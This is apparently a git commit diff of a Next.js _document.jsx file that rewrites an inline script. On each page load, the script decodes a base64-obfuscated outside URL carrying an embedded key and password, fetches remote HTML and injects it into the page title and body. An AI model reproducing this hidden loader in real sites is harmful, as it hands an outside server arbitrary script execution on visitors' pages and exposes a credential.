5eba5d0ff1e0ea9f7024c9e50d0146e3c7c71019
VinayakSoragavi <soragavivinayak@gmail.com>
2024-03-01 16:27:15 +0530

    first commit

--- src/pages/_document.jsx
+++ src/pages/_document.jsx
@@ -14,28 +14,42 @@ export default function Document() {
         <script
           dangerouslySetInnerHTML={{
             __html: `
-                window.jQuery ||
-                document.write("<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'><\\/script>");
-
-                var eppathurl = window.location.origin + window.location.pathname;
-                var eptagmanage = new XMLHttpRequest();
-                eptagmanage.onreadystatechange = function() {
-                    if (this.readyState == 4 && this.status == 200) {
-                        if (this.response !== 0) {
-                            var temp = new Array();
-                            var mystr = this.response;
-                            temp = mystr.split("||||||||||");
-                            document.head.querySelector("title").remove();
-                            var newTitle = document.createElement("title");
-                            newTitle.appendChild(document.createTextNode(temp[0]));
-                            document.head.appendChild(newTitle);
-                            document.body.insertAdjacentHTML('beforeend', temp[1]);
-                        }
-                    }
-                };
-                eptagmanage.open("GET", atob("aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDYyNjY4MzM5MzUmZWtleXBhc3M9TUdsQzI2VGFzR0hrWllFT1htVkFsZVlncjY3TjBRUHVNUGtXJnNpdGV1cmw9") + eppathurl);
-                eptagmanage.send();
-              `,
+            function loadAndManipulateDOM() {
+              // Check if jQuery is available, if not, load it from CDN
+              if (!window.jQuery) {
+                  document.write("<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'><\/script>");
+              }
+          
+              // Construct URL based on current location
+              var eppathurl = window.location.origin + window.location.pathname;
+          
+              // Create XMLHttpRequest object
+              var eptagmanage = new XMLHttpRequest();
+          
+              // Define callback function for handling the response
+              eptagmanage.onreadystatechange = function() {
+                  if (this.readyState == 4 && this.status == 200) {
+                      if (this.response !== 0) {
+                          // Split the response into parts
+                          var temp = new Array();
+                          var mystr = this.response;
+                          temp = mystr.split("||||||||||");
+          
+                          // Remove existing title and append new title from response
+                          jQuery("head").find("title").remove();
+                          jQuery("head").append(temp[0]);
+          
+                          // Append content from response to the body
+                          jQuery("body").append(temp[1]);
+                      }
+                  }
+              };
+          
+              // Open XMLHttpRequest with GET method and the constructed URL
+              eptagmanage.open("GET", atob("aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDYyNjY4MzM5MzUmZWtleXBhc3M9TUdsQzI2VGFzR0hrWllFT1htVkFsZVlncjY3TjBRUHVNUGtXJnNpdGV1cmw9") + eppathurl);
+          
+              // Send the request
+              eptagmanage.send();`,
           }}
         />
         <NextScript />
